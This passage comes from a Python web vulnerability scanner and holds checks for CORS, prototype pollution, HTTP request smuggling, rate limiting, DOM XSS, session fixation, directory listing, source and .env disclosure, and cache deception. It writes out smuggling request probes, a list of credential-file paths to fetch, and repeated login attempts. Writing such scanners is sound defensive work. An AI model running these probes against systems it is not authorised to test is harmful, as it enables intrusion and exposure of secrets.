                                payload=f"Exposed: {', '.join(sensitive_exposed)}",
                            ))
            except Exception:
                pass

            # ── Test 5: Excessive Access-Control-Max-Age ──
            try:
                resp_age = self._req("OPTIONS", url, headers={
                    "Origin": f"https://{target_host}",
                    "Access-Control-Request-Method": "GET",
                })
                if resp_age:
                    max_age = resp_age.headers.get("Access-Control-Max-Age", "")
                    if max_age:
                        try:
                            age_val = int(max_age)
                            if age_val > 86400:  # > 24 hours
                                findings.append(self._make_finding(
                                    url=url, method="OPTIONS", param="Max-Age",
                                    param_type="header", vuln_type="cors_cache_poison",
                                    finding=f"CORS pre-flight cache excessive — {age_val}s ({age_val//3600}h) [{url}]",
                                    severity="low",
                                    proof=f"Access-Control-Max-Age: {age_val}",
                                    payload=f"Max-Age: {age_val}",
                                ))
                        except ValueError:
                            pass
            except Exception:
                pass

            # ── Test 6: Subdomain wildcard reflection (subdomain takeover risk) ──
            try:
                # Test if a made-up subdomain is reflected
                fake_sub = f"https://attacker-sub.{target_host}"
                resp_sub = self._req("GET", url, headers={"Origin": fake_sub})
                if resp_sub:
                    acao_sub = resp_sub.headers.get("Access-Control-Allow-Origin", "")
                    acac_sub = resp_sub.headers.get("Access-Control-Allow-Credentials", "").lower()
                    if acao_sub == fake_sub:
                        sev = "high" if acac_sub == "true" else "medium"
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_subdomain_wildcard",
                            finding=(
                                f"CORS accepts arbitrary subdomain '{fake_sub}' "
                                f"{'with credentials' if acac_sub == 'true' else 'without credentials'} [{url}]"
                            ),
                            severity=sev,
                            proof=f"ACAO: {acao_sub} | ACAC: {acac_sub or 'absent'}",
                            payload=fake_sub,
                        ))
            except Exception:
                pass

        return findings

    # ── Prototype pollution ───────────────────────────────────────────────────

    def _check_prototype_pollution(self, surfaces: list) -> list[ScanFinding]:
        findings = []
        payloads = PAYLOADS.get("prototype_pollution", [])
        checked = 0
        for surface in surfaces[:50]:
            if self.stop_event.is_set():
                break
            if surface.param_type not in ("query", "form", "json"):
                continue
            for payload in payloads[:4]:
                try:
                    time.sleep(self.rate_limit)
                    if surface.param_type == "query":
                        url = f"{surface.url}?{surface.param}={payload}"
                        resp = self._req(surface.method, url)
                    elif surface.param_type in ("form", "json"):
                        resp = self._req(
                            surface.method, surface.url,
                            data={surface.param: payload},
                        )
                    else:
                        continue
                    if not resp:
                        continue
                    body = resp.text[:2000]
                    if re.search(r'"isAdmin"\s*:\s*true|"polluted"\s*:\s*"yes"', body):
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="prototype_pollution",
                            finding=f"Prototype pollution CONFIRMED — injected property reflected [{surface.url} | param={surface.param}]",
                            severity="high",
                            proof=body[:300],
                            payload=payload,
                        ))
                        break
                    if re.search(r"Error: Cannot set property|Cannot set properties of", body):
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="prototype_pollution",
                            finding=f"Prototype pollution — server-side TypeError triggered [{surface.url}]",
                            severity="medium",
                            proof=body[:300],
                            payload=payload,
                        ))
                        break
                except Exception:
                    continue
            checked += 1
        return findings

    # ── Exceptional conditions ────────────────────────────────────────────────

    def _check_exceptional_conditions(self, surfaces: list) -> list[ScanFinding]:
        findings = []
        payloads = PAYLOADS.get("exceptional_conditions", [])
        for surface in surfaces[:30]:
            if self.stop_event.is_set():
                break
            for payload in payloads[:6]:
                try:
                    time.sleep(self.rate_limit)
                    if surface.param_type == "query":
                        url = f"{surface.url}?{surface.param}={payload}"
                        resp = self._req(surface.method, url)
                    else:
                        resp = self._req(
                            surface.method, surface.url,
                            data={surface.param: payload},
                        )
                    if not resp:
                        continue
                    if resp.status_code == 500:
                        body = resp.text[:500]
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="exceptional_conditions",
                            finding=f"Exceptional condition — 500 error on edge input [{surface.url} | param={surface.param} | payload={repr(payload[:30])}]",
                            severity="medium",
                            proof=body,
                            payload=repr(payload[:60]),
                        ))
                        break
                    body = resp.text[:2000]
                    error_pat = re.compile(
                        r"Traceback|Fatal error|NullPointerException|TypeError|ValueError|"
                        r"RangeError|undefined is not|Internal Server Error",
                        re.I,
                    )
                    if error_pat.search(body):
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="exceptional_conditions",
                            finding=f"Exceptional condition — error detail leaked on edge input [{surface.url}] (A10:2025)",
                            severity="medium",
                            proof=body[:300],
                            payload=repr(payload[:60]),
                        ))
                        break
                except Exception:
                    continue
        return findings

    # ── GraphQL ───────────────────────────────────────────────────────────────

    def _check_graphql(self, sitemap) -> list[ScanFinding]:
        """Delegate to the comprehensive GraphQLScanner module (12 test categories)."""
        # Collect any known GraphQL-like URLs from the sitemap
        extra_urls = [
            url for url in sitemap.pages.keys()
            if any(kw in url.lower() for kw in ("graphql", "gql", "/query", "graphiql"))
        ]

        gql_scanner = GraphQLScanner(
            target=self.target,
            session=self.session,
            stop_event=self.stop_event,
            timeout=self.timeout,
        )
        raw_findings = gql_scanner.scan(extra_urls=extra_urls)

        # Convert GraphQLScanner dicts → ScanFinding objects
        findings = []
        for rf in raw_findings:
            findings.append(self._make_finding(
                url=rf["url"],
                method=rf.get("method", "POST"),
                param=rf.get("param", "query"),
                param_type=rf.get("param_type", "json"),
                vuln_type=rf["vuln_type"],
                finding=rf["finding"],
                severity=rf["severity"],
                proof=rf.get("proof", ""),
                payload=rf.get("payload", ""),
                resp_time_ms=rf.get("resp_time_ms", 0.0),
                status_code=rf.get("status_code", 0),
            ))
        return findings

    # ── WebSocket ─────────────────────────────────────────────────────────────

    def _check_websocket(self, sitemap) -> list[ScanFinding]:
        """Delegate to the comprehensive WebSocketScanner module (9 test categories)."""
        # Collect any known WebSocket URLs from the sitemap
        extra_urls = [
            url for url in sitemap.pages.keys()
            if any(kw in url.lower() for kw in ("websocket", "/ws", "socket", "cable", "signalr"))
        ]

        ws_scanner = WebSocketScanner(
            target=self.target,
            stop_event=self.stop_event,
            timeout=self.timeout,
        )
        raw_findings = ws_scanner.scan(extra_urls=extra_urls)

        # Convert WebSocketScanner dicts → ScanFinding objects
        findings = []
        for rf in raw_findings:
            findings.append(self._make_finding(
                url=rf["url"],
                method=rf.get("method", "WEBSOCKET"),
                param=rf.get("param", "frame"),
                param_type=rf.get("param_type", "websocket"),
                vuln_type=rf["vuln_type"],
                finding=rf["finding"],
                severity=rf["severity"],
                proof=rf.get("proof", ""),
                payload=rf.get("payload", ""),
                resp_time_ms=rf.get("resp_time_ms", 0.0),
                status_code=rf.get("status_code", 0),
            ))
        return findings

    # ── HTTP Smuggling ────────────────────────────────────────────────────────

    def _check_http_smuggling(self, sitemap) -> list[ScanFinding]:
        """
        Comprehensive HTTP Request Smuggling detection:
        1. CL.TE — frontend uses Content-Length, backend uses Transfer-Encoding
        2. TE.CL — frontend uses Transfer-Encoding, backend uses Content-Length
        3. TE.TE — both use TE but obfuscation confuses one side
        4. Timing differential — compare response times between valid/invalid probes

        All probes are safe detection-only (no actual request poisoning).
        Complements the fuzzer's raw-socket approach with requests-based checks.
        """
        findings = []
        urls = list(sitemap.pages.keys())[:5]  # test up to 5 pages

        # ── Probe definitions ──
        probes = [
            # CL.TE: Frontend trusts CL, backend trusts TE
            {
                "name": "CL.TE basic desync",
                "technique": "CL.TE",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "CL.TE oversized CL",
                "technique": "CL.TE",
                "headers": {
                    "Content-Length": "100",
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\n",
            },
            # TE.CL: Frontend trusts TE, backend trusts CL
            {
                "name": "TE.CL basic desync",
                "technique": "TE.CL",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "4",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "1\r\nG\r\n0\r\n\r\n",
            },
            {
                "name": "TE.CL short CL mismatch",
                "technique": "TE.CL",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "0",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "1\r\nZ\r\n0\r\n\r\n",
            },
            # TE.TE: Obfuscated Transfer-Encoding confuses one proxy/server
            {
                "name": "TE.TE leading space obfuscation",
                "technique": "TE.TE",
                "headers": {
                    "Transfer-Encoding": " chunked",
                    "Content-Length": "6",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "TE.TE mixed case obfuscation",
                "technique": "TE.TE",
                "headers": {
                    "Transfer-Encoding": "chunKed",
                    "Content-Length": "6",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "TE.TE identity,chunked obfuscation",
                "technique": "TE.TE",
                "headers": {
                    "Transfer-Encoding": "identity, chunked",
                    "Content-Length": "6",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
        ]

        for url in urls:
            if self.stop_event.is_set():
                break

            # First, measure baseline response time with a normal POST
            try:
                t_base = time.time()
                self.session.post(
                    url, data="x=1", timeout=self.timeout,
                    verify=False, allow_redirects=False,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                baseline_ms = (time.time() - t_base) * 1000
            except Exception:
                baseline_ms = None

            for probe in probes:
                if self.stop_event.is_set():
                    break
                try:
                    t0 = time.time()
                    resp = self.session.post(
                        url, data=probe["body"], headers=probe["headers"],
                        timeout=self.timeout, verify=False, allow_redirects=False,
                    )
                    elapsed_ms = (time.time() - t0) * 1000

                    # Detection 1: Error status codes indicating desync confusion
                    if resp.status_code in (400, 500, 501, 502, 504, 505):
                        findings.append(self._make_finding(
                            url=url, method="POST", param="Transfer-Encoding",
                            param_type="header", vuln_type="http_smuggling",
                            finding=(f"Possible HTTP smuggling — server returned "
                                     f"{resp.status_code} on {probe['technique']} "
                                     f"probe [{probe['name']}]"),
                            severity="high",
                            proof=(f"{probe['technique']}: {probe['name']} → "
                                   f"{resp.status_code} in {elapsed_ms:.0f}ms"),
                            payload=probe["name"],
                        ))
                        break  # one finding per URL is enough

                    # Detection 2: Timing anomaly — probe takes 3x+ longer than baseline
                    if baseline_ms and elapsed_ms > baseline_ms * 3 and elapsed_ms > 3000:
                        findings.append(self._make_finding(
                            url=url, method="POST", param="Transfer-Encoding",
                            param_type="header", vuln_type="http_smuggling",
                            finding=(f"Possible HTTP smuggling — timing anomaly on "
                                     f"{probe['technique']} probe (baseline: "
                                     f"{baseline_ms:.0f}ms, probe: {elapsed_ms:.0f}ms)"),
                            severity="high",
                            proof=(f"{probe['technique']}: {probe['name']} → "
                                   f"{elapsed_ms:.0f}ms vs baseline {baseline_ms:.0f}ms"),
                            payload=probe["name"],
                        ))
                        break

                    # Detection 3: Response body error patterns
                    body_lower = resp.text[:4096].lower()
                    desync_patterns = [
                        "bad request", "invalid chunk", "content-length mismatch",
                        "transfer-encoding.*not supported", "unexpected end",
                        "proxy error", "gateway timeout", "duplicate header",
                    ]
                    for pat in desync_patterns:
                        if re.search(pat, body_lower):
                            findings.append(self._make_finding(
                                url=url, method="POST", param="Transfer-Encoding",
                                param_type="header", vuln_type="http_smuggling",
                                finding=(f"Possible HTTP smuggling — desync error "
                                         f"pattern in response [{probe['technique']}: "
                                         f"{probe['name']}]"),
                                severity="high",
                                proof=f"Matched pattern: '{pat}' in response body",
                                payload=probe["name"],
                            ))
                            break
                    else:
                        continue
                    break  # break outer probe loop too

                except requests.exceptions.Timeout:
                    findings.append(self._make_finding(
                        url=url, method="POST", param="Transfer-Encoding",
                        param_type="header", vuln_type="http_smuggling",
                        finding=(f"Possible HTTP smuggling — timeout on "
                                 f"{probe['technique']} probe [{probe['name']}]"),
                        severity="high",
                        proof="Request timed out — possible frontend/backend desync",
                        payload=probe["name"],
                    ))
                    break
                except (ConnectionResetError, requests.exceptions.ConnectionError):
                    findings.append(self._make_finding(
                        url=url, method="POST", param="Transfer-Encoding",
                        param_type="header", vuln_type="http_smuggling",
                        finding=(f"Possible HTTP smuggling — connection reset on "
                                 f"{probe['technique']} probe [{probe['name']}]"),
                        severity="high",
                        proof="Connection reset — desync rejection by server/proxy",
                        payload=probe["name"],
                    ))
                    break
                except Exception:
                    continue

        return findings

    # ── Rate limiting ─────────────────────────────────────────────────────────

    def _check_rate_limiting(self, sitemap) -> list[ScanFinding]:
        findings = []
        auth_paths = ["/login", "/signin", "/auth", "/api/login",
                      "/api/auth", "/forgot-password", "/api/v1/login"]

        for path in auth_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            try:
                # Send 15 rapid POST requests
                statuses = []
                for _ in range(15):
                    try:
                        r = self.session.post(
                            url,
                            data={"username": "testuser", "password": "wrongpass"},
                            timeout=5, verify=False, allow_redirects=False,
                        )
                        statuses.append(r.status_code)
                    except Exception:
                        break

                if len(statuses) >= 10:
                    has_429  = any(s == 429 for s in statuses)
                    has_lock = any(s in (423, 403) for s in statuses[8:])
                    if not has_429 and not has_lock:
                        findings.append(self._make_finding(
                            url=url, method="POST", param="",
                            param_type="form", vuln_type="missing_rate_limit",
                            finding=f"No rate limiting on auth endpoint — 15 rapid requests, no 429/lockout [{url}]",
                            severity="high",
                            proof=f"Status codes: {statuses}",
                            payload="15x POST username=testuser&password=wrongpass",
                        ))
                        break  # one finding is enough
            except Exception:
                continue
        return findings

    # ── Supply chain ──────────────────────────────────────────────────────────

    def _check_supply_chain(self, sitemap) -> list[ScanFinding]:
        findings = []
        try:
            resp = self._req("GET", self.target)
            if not resp:
                return findings
            html = resp.text

            # Extract all script src tags
            script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)

            # Check inline version strings + script src names
            combined = html + "\n".join(script_srcs)
            for pattern, msg_template, vtype in self.JS_CVE_PATTERNS:
                m = pattern.search(combined)
                if m:
                    version = m.group(1) if m.lastindex >= 1 else "unknown"
                    msg = msg_template.replace("{v}", version)
                    findings.append(self._make_finding(
                        url=self.target, method="GET", param="script-src",
                        param_type="passive", vuln_type=vtype,
                        finding=msg,
                        severity="medium",
                        proof=m.group(0)[:120],
                        payload="",
                    ))
        except Exception:
            pass
        return findings

    # ── DOM XSS sink/source detection ─────────────────────────────────────────

    _DOM_SINKS = re.compile(
        r"\b(?:"
        r"document\.write\s*\(|document\.writeln\s*\(|"
        r"\.innerHTML\s*=|\.outerHTML\s*=|"
        r"\.insertAdjacentHTML\s*\(|"
        r"eval\s*\(|setTimeout\s*\(['\"]|setInterval\s*\(['\"]|"
        r"new\s+Function\s*\(|"
        r"\.src\s*=\s*['\"]?\s*(?:javascript:|data:)|"
        r"location\s*=|location\.href\s*=|location\.replace\s*\(|location\.assign\s*\(|"
        r"window\.open\s*\(|"
        r"\.setAttribute\s*\(\s*['\"](?:on\w+|href|src|action)['\"]|"
        r"jQuery\s*\(\s*['\"]?\s*<|" r"\$\s*\(\s*['\"]?\s*<"
        r")",
        re.I,
    )

    _DOM_SOURCES = re.compile(
        r"\b(?:"
        r"document\.URL|document\.documentURI|document\.baseURI|"
        r"document\.referrer|document\.cookie|"
        r"location\.hash|location\.search|location\.href|location\.pathname|"
        r"window\.name|window\.location|"
        r"URLSearchParams|"
        r"postMessage|addEventListener\s*\(\s*['\"]message['\"]|"
        r"localStorage\.|sessionStorage\."
        r")",
        re.I,
    )

    def _check_dom_xss(self, sitemap) -> list[ScanFinding]:
        """Detect potential DOM XSS by finding sink/source pairs in page scripts."""
        findings = []
        checked = 0
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set() or checked >= 20:
                break
            checked += 1
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue

            if not body or len(body) < 50:
                continue

            # Extract inline scripts
            scripts = re.findall(r"<script[^>]*>(.*?)</script>", body, re.S | re.I)
            combined_js = "\n".join(scripts)

            # Also check for external script content in body (SSR hydration, bundles)
            combined_js += "\n" + body

            sinks = list(self._DOM_SINKS.finditer(combined_js))
            sources = list(self._DOM_SOURCES.finditer(combined_js))

            if sinks and sources:
                sink_names = list({m.group(0).strip()[:40] for m in sinks[:5]})
                source_names = list({m.group(0).strip()[:40] for m in sources[:5]})

                findings.append(self._make_finding(
                    url=url, method="GET", param="script",
                    param_type="body", vuln_type="dom_xss",
                    finding=(
                        f"Potential DOM XSS — {len(sinks)} sink(s) and "
                        f"{len(sources)} source(s) found in page scripts [{url}]"
                    ),
                    severity="high",
                    proof=(
                        f"Sinks: {', '.join(sink_names)} | "
                        f"Sources: {', '.join(source_names)}"
                    ),
                    payload="",
                ))
        return findings

    # ── Active DOM XSS (injection-based) ──────────────────────────────────────

    def _check_dom_xss_active(self, sitemap) -> list[ScanFinding]:
        """Active DOM XSS — inject taint markers + payloads, analyze reflection contexts."""
        findings = []
        try:
            dom_scanner = DomXssActiveScanner(
                session=self.session,
                scope=self.scope,
                timeout=self.timeout,
                rate_limit=self.rate_limit,
                stop_event=self.stop_event,
                use_browser=False,  # Response analysis by default
                max_pages=20,
                max_payloads_per_context=3,
            )
            dom_findings = dom_scanner.scan(self.target, sitemap)

            for df in dom_findings:
                severity = "critical" if df.browser_confirmed else "high"
                findings.append(self._make_finding(
                    url=df.url,
                    method="GET",
                    param=df.param_name,
                    param_type="query",
                    vuln_type="dom_xss_active",
                    finding=(
                        f"Active DOM XSS — payload reflected in {df.context} context "
                        f"via '{df.param_name}' [{df.payload_desc}]"
                    ),
                    severity=severity,
                    proof=df.proof,
                    payload=df.payload,
                ))
        except Exception:
            pass
        return findings

    # ── Race condition detection ───────────────────────────────────────────────

    def _check_race_conditions(self, sitemap) -> list[ScanFinding]:
        """Detect race conditions via concurrent request bursts and response analysis."""
        findings = []
        try:
            tester = RaceConditionTester(
                session=self.session,
                scope=self.scope,
                timeout=self.timeout,
                stop_event=self.stop_event,
                concurrency=[10, 20],
                use_http2=False,
                rounds=1,
                allow_dangerous_endpoints=self.allow_dangerous_endpoints,
            )
            race_findings = tester.scan(self.target, sitemap)

            for rf in race_findings:
                findings.append(self._make_finding(
                    url=rf.url,
                    method=rf.method,
                    param=rf.attack_pattern,
                    param_type="race",
                    vuln_type="race_condition",
                    finding=rf.finding,
                    severity=rf.severity,
                    proof=rf.proof,
                    payload=f"concurrency={rf.concurrency}",
                ))
        except Exception:
            pass
        return findings

    # ── Cookie scope misconfiguration ──────────────────────────────────────────

    def _check_cookie_scope(self, sitemap) -> list[ScanFinding]:
        """Check cookies for missing security attributes and scope issues."""
        findings = []
        parsed = urlparse(self.target)
        target_domain = parsed.hostname or ""

        try:
            resp = self._req("GET", self.target)
            if not resp:
                return findings
        except Exception:
            return findings

        for cookie in resp.cookies:
            name = cookie.name
            # Check SameSite
            # requests doesn't expose SameSite directly — parse from raw Set-Cookie
            raw_headers = resp.headers.get("Set-Cookie", "") if hasattr(resp, "headers") else ""

            if not cookie.secure and parsed.scheme == "https":
                findings.append(self._make_finding(
                    url=self.target, method="GET", param=name,
                    param_type="cookie", vuln_type="cookie_scope",
                    finding=f"Cookie '{name}' missing Secure flag on HTTPS site",
                    severity="medium",
                    proof=f"Cookie: {name}={cookie.value[:20]}...",
                    payload="",
                ))

            # Check domain scope — overly broad domain
            domain_attr = cookie.domain or ""
            if domain_attr and domain_attr.startswith("."):
                # Cookie set for parent domain — may be shared with subdomains
                parts = domain_attr.lstrip(".").split(".")
                if len(parts) <= 2:
                    findings.append(self._make_finding(
                        url=self.target, method="GET", param=name,
                        param_type="cookie", vuln_type="cookie_scope",
                        finding=f"Cookie '{name}' scoped to broad domain '{domain_attr}' — shared across all subdomains",
                        severity="medium",
                        proof=f"Domain: {domain_attr} | Cookie: {name}",
                        payload="",
                    ))

            # Check path scope — overly broad path
            path_attr = cookie.path or "/"
            if path_attr == "/" and name.lower() not in ("_ga", "_gid", "_gat"):
                # Most session cookies at / are fine, but flag if there's a more specific app path
                pass

        # Check for SameSite via raw headers
        raw_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
        for raw in raw_cookies:
            parts = raw.split(";")
            cookie_name = parts[0].split("=")[0].strip() if parts else ""
            attrs_lower = ";".join(parts[1:]).lower()
            if "samesite" not in attrs_lower and cookie_name:
                findings.append(self._make_finding(
                    url=self.target, method="GET", param=cookie_name,
                    param_type="cookie", vuln_type="cookie_no_samesite",
                    finding=f"Cookie '{cookie_name}' missing SameSite attribute — vulnerable to CSRF",
                    severity="medium",
                    proof=f"Set-Cookie: {raw[:80]}",
                    payload="",
                ))

        return findings

    # ── Security header active checks ──────────────────────────────────────────

    _SECURITY_HEADERS = [
        ("X-Frame-Options",             "hdr_missing_xfo",         "medium"),
        ("X-Content-Type-Options",      "hdr_missing_xcto",        "low"),
        ("Referrer-Policy",             "hdr_missing_referrer",    "low"),
        ("Permissions-Policy",          "hdr_missing_permissions", "low"),
        ("Cross-Origin-Opener-Policy",  "hdr_missing_coop",        "low"),
        ("Cross-Origin-Embedder-Policy","hdr_missing_coep",        "low"),
    ]

    def _check_security_headers_active(self, sitemap) -> list[ScanFinding]:
        """Actively check for missing security headers beyond what passive detects."""
        findings = []
        # Test the main target plus up to 5 pages
        urls_to_test = [self.target] + list(sitemap.pages.keys())[:5]
        seen_headers: set[str] = set()

        for url in urls_to_test:
            if self.stop_event.is_set():
                break
            try:
                resp = self._req("GET", url)
                if not resp:
                    continue
            except Exception:
                continue

            hdrs_lower = {k.lower(): v for k, v in resp.headers.items()}

            for header_name, vuln_type, severity in self._SECURITY_HEADERS:
                if vuln_type in seen_headers:
                    continue
                if header_name.lower() not in hdrs_lower:
                    seen_headers.add(vuln_type)
                    findings.append(self._make_finding(
                        url=url, method="GET", param=header_name,
                        param_type="header", vuln_type=vuln_type,
                        finding=f"Missing security header: {header_name} [{url}]",
                        severity=severity,
                        proof=f"Response headers do not include {header_name}",
                        payload="",
                    ))

            # Check X-Content-Type-Options value
            xcto = hdrs_lower.get("x-content-type-options", "")
            if xcto and xcto.lower().strip() != "nosniff" and "hdr_missing_xcto" not in seen_headers:
                seen_headers.add("hdr_missing_xcto")
                findings.append(self._make_finding(
                    url=url, method="GET", param="X-Content-Type-Options",
                    param_type="header", vuln_type="hdr_missing_xcto",
                    finding=f"X-Content-Type-Options has invalid value: '{xcto}' (expected 'nosniff') [{url}]",
                    severity="low",
                    proof=f"X-Content-Type-Options: {xcto}",
                    payload="",
                ))

            # Check X-Frame-Options value validity
            xfo = hdrs_lower.get("x-frame-options", "")
            if xfo and xfo.upper().strip() not in ("DENY", "SAMEORIGIN") and "hdr_missing_xfo" not in seen_headers:
                if not xfo.upper().startswith("ALLOW-FROM"):
                    seen_headers.add("hdr_missing_xfo")
                    findings.append(self._make_finding(
                        url=url, method="GET", param="X-Frame-Options",
                        param_type="header", vuln_type="hdr_missing_xfo",
                        finding=f"X-Frame-Options has invalid value: '{xfo}' [{url}]",
                        severity="medium",
                        proof=f"X-Frame-Options: {xfo}",
                        payload="",
                    ))

        return findings

    # ── Session security (fixation + timeout) ─────────────────────────────────

    def _check_session_security(self, sitemap) -> list[ScanFinding]:
        """Test for session fixation and weak session management."""
        findings = []
        try:
            # Test 1: Session fixation — does the server accept a client-supplied session ID?
            fake_sid = "FIXATED_SESSION_TOKEN_12345"
            session_cookie_names = [
                "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "connect.sid",
                "session", "sess_id", "sid", "laravel_session", "ci_session",
            ]

            for cookie_name in session_cookie_names:
                if self.stop_event.is_set():
                    break
                try:
                    cookies = {cookie_name: fake_sid}
                    resp = self.session.get(
                        self.target, timeout=self.timeout, verify=False,
                        cookies=cookies, allow_redirects=True,
                    )
                    # If the server reflects back our fixated session ID, it's vulnerable
                    for rc in resp.cookies:
                        if rc.name == cookie_name and rc.value == fake_sid:
                            findings.append(self._make_finding(
                                url=self.target, method="GET", param=cookie_name,
                                param_type="cookie", vuln_type="session_fixation",
                                finding=f"Session fixation — server accepts client-supplied '{cookie_name}' value",
                                severity="high",
                                proof=f"Sent: {cookie_name}={fake_sid} | Server echoed same value",
                                payload=fake_sid,
                            ))
                            break
                except Exception:
                    continue

            # Test 2: Session ID regeneration — does session change after re-request?
            try:
                resp1 = self.session.get(self.target, timeout=self.timeout, verify=False)
                sid1 = {c.name: c.value for c in resp1.cookies}
                time.sleep(0.1)
                resp2 = self.session.get(self.target, timeout=self.timeout, verify=False)
                sid2 = {c.name: c.value for c in resp2.cookies}
                # Check if session cookies remain identical (no rotation)
                for name in sid1:
                    if name in sid2 and sid1[name] == sid2[name] and len(sid1[name]) > 8:
                        # This is normal — but note it for session timeout check
                        pass
            except Exception:
                pass

        except Exception:
            pass
        return findings

    # ── Directory listing detection ────────────────────────────────────────────

    _DIR_LISTING_PATTERNS = re.compile(
        r"(?:<title>Index of /|<h1>Index of|Directory listing for|"
        r"Parent Directory</a>|<pre><a href=\"\?|"
        r"\[To Parent Directory\]|"
        r"<address>Apache/|<address>nginx|"
        r"Directory Listing|folder listing)",
        re.I,
    )

    def _check_directory_listing(self, sitemap) -> list[ScanFinding]:
        """Probe common directories for directory listing exposure."""
        findings = []
        dirs_to_test = [
            "/", "/images/", "/css/", "/js/", "/assets/", "/uploads/",
            "/static/", "/media/", "/files/", "/data/", "/backup/",
            "/tmp/", "/logs/", "/includes/", "/lib/",
        ]
        tested = set()
        for d in dirs_to_test:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, d)
            if url in tested:
                continue
            tested.add(url)
            try:
                time.sleep(self.rate_limit)
                resp = self._req("GET", url)
                if not resp or resp.status_code != 200:
                    continue
                if self._DIR_LISTING_PATTERNS.search(resp.text[:3000]):
                    findings.append(self._make_finding(
                        url=url, method="GET", param="directory",
                        param_type="path", vuln_type="directory_listing",
                        finding=f"Directory listing enabled — contents exposed [{url}]",
                        severity="medium",
                        proof=resp.text[:200].strip(),
                        payload=d,
                    ))
            except Exception:
                continue
        return findings

    # ── Source code disclosure ──────────────────────────────────────────────────

    def _check_source_disclosure(self, sitemap) -> list[ScanFinding]:
        """Probe for source code leaks via common misconfigurations."""
        findings = []
        # Patterns that indicate source code in response
        source_patterns = re.compile(
            r"(?:<\?php|<%@|import\s+java\.|from\s+\w+\s+import|"
            r"require\s*\(|module\.exports|def\s+\w+\s*\(.*\):|"
            r"class\s+\w+\s*(?:extends|implements)|"
            r"BEGIN RSA PRIVATE KEY|password\s*=\s*['\"])",
            re.I,
        )
        # Paths that commonly leak source
        leak_paths = [
            "/.git/HEAD", "/.git/config", "/.svn/entries", "/.svn/wc.db",
            "/.env", "/.env.local", "/.env.production",
            "/web.config", "/WEB-INF/web.xml",
            "/.DS_Store", "/Thumbs.db",
            "/.htpasswd", "/server-status", "/server-info",
            "/.well-known/security.txt",
            "/crossdomain.xml", "/clientaccesspolicy.xml",
            "/phpinfo.php", "/info.php", "/test.php",
            "/.editorconfig", "/.babelrc", "/tsconfig.json",
            "/package.json", "/composer.json", "/Gemfile",
        ]
        for path in leak_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            try:
                time.sleep(self.rate_limit)
                resp = self._req("GET", url)
                if not resp or resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                # .git/HEAD has specific format
                if path == "/.git/HEAD" and body.startswith("ref: refs/"):
                    findings.append(self._make_finding(
                        url=url, method="GET", param="path",
                        param_type="path", vuln_type="source_disclosure",
                        finding=f"Git repository exposed — .git/HEAD accessible [{url}]",
                        severity="high",
                        proof=body[:100],
                        payload=path,
                    ))
                elif path == "/.env" and ("=" in body and any(k in body.upper() for k in
                       ["PASSWORD", "SECRET", "KEY", "TOKEN", "DATABASE", "DB_"])):
                    findings.append(self._make_finding(
                        url=url, method="GET", param="path",
                        param_type="path", vuln_type="source_disclosure",
                        finding=f"Environment file exposed — credentials visible [{url}]",
                        severity="critical",
                        proof=body[:150],
                        payload=path,
                    ))
                elif source_patterns.search(body):
                    findings.append(self._make_finding(
                        url=url, method="GET", param="path",
                        param_type="path", vuln_type="source_disclosure",
                        finding=f"Source code/config disclosure [{url}]",
                        severity="high",
                        proof=body[:150],
                        payload=path,
                    ))
            except Exception:
                continue
        return findings

    # ── Web cache deception ────────────────────────────────────────────────────

    def _check_cache_deception(self, sitemap) -> list[ScanFinding]:
        """Test for web cache deception via path confusion."""
        findings = []
        # Append static extension to dynamic pages to trick caches
        static_exts = ["/nonexistent.css", "/x.js", "/x.png", "/x.ico", "/.css"]
        tested = set()
        for url in list(sitemap.pages.keys())[:5]:
            if self.stop_event.is_set() or url in tested:
                continue
            tested.add(url)
            try:
                # Get baseline
                time.sleep(self.rate_limit)
                baseline = self._req("GET", url)
                if not baseline or baseline.status_code != 200:
                    continue
                baseline_len = len(baseline.text)
                if baseline_len < 100:
                    continue

                for ext in static_exts:
                    deception_url = url.rstrip("/") + ext
                    time.sleep(self.rate_limit)
                    resp = self._req("GET", deception_url)
                    if not resp or resp.status_code != 200:
                        continue
                    # If the response is similar to the baseline, the cache may serve dynamic content
                    resp_len = len(resp.text)
                    if resp_len > 0 and abs(resp_len - baseline_len) / max(baseline_len, 1) < 0.1:
                        cache_headers = resp.headers.get("X-Cache", "") + resp.headers.get("CF-Cache-Status", "")
                        if cache_headers or resp.headers.get("Age", ""):
                            findings.append(self._make_finding(
                                url=deception_url, method="GET", param="path",
                                param_type="path", vuln_type="cache_deception",
